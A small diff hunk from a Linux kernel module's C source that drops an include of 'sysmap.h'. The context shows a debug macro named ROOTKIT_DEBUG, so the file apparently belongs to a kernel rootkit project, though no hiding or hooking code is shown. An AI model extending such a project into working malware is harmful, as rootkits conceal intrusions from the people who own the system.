@@ -4,8 +4,6 @@
 #include <linux/module.h>
 #include <linux/types.h>
 
-#include "sysmap.h"
-
 /* some macros */
 #ifdef DEBUG
 #define ROOTKIT_DEBUG(...) printk(KERN_INFO __VA_ARGS__)
